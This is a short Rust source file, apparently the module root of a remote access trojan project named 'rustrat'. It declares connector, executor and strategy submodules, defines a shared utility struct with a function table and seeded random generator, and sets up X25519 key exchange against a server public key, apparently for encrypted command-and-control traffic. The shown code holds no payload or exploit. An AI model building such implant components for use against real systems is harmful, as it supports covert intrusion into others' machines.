pub mod connector;
pub mod executor;
pub mod strategy;

use crate::ffi::FnTable;

use rustrat_common::encryption;

use rustrat_prng_seed::get_rand_seed;

use std::cell::RefCell;
use std::ops::{Deref, DerefMut};
use std::rc::Rc;

use rand::rngs::StdRng;
use rand::SeedableRng;

#[derive(Clone)]
pub struct CommonUtils {
    pub fn_table: Rc<RefCell<FnTable>>,
    rng: Rc<RefCell<StdRng>>,
}

impl CommonUtils {
    pub fn new() -> Self {
        let fn_table = Rc::new(RefCell::new(FnTable::new()));
        let rng = Rc::new(RefCell::new(StdRng::from_seed(get_rand_seed())));

        Self { fn_table, rng }
    }

    pub fn get_rng(&self) -> StdRng {
        let mut rng_guard = self.rng.deref().borrow_mut();
        let rng = rng_guard.deref_mut();

        StdRng::from_rng(rng).unwrap()
    }
}

#[derive(Copy, Clone)]
pub struct CryptoConfiguration {
    pub public_key: encryption::PublicKey,
    pub shared_key: encryption::SharedKey,
}

impl CryptoConfiguration {
    pub fn new<CR: rand::Rng + rand::CryptoRng>(
        rng: &mut CR,
        server_public_key: encryption::PublicKey,
    ) -> Self {
        let mut raw_private_key: encryption::PublicKey = Default::default();
        rng.fill_bytes(&mut raw_private_key);

        // TODO use EphemeralSecret when x25519-dalek upgrades rand dependency, ref https://github.com/dalek-cryptography/x25519-dalek/issues/65 https://github.com/dalek-cryptography/x25519-dalek/pull/64
        let private_key = x25519_dalek::StaticSecret::from(raw_private_key);
        let public_key = x25519_dalek::PublicKey::from(&private_key).to_bytes();
        let x25519_public_key = x25519_dalek::PublicKey::from(server_public_key);

        let shared_key = private_key.diffie_hellman(&x25519_public_key).to_bytes();

        CryptoConfiguration {
            public_key,
            shared_key,
        }
    }
}
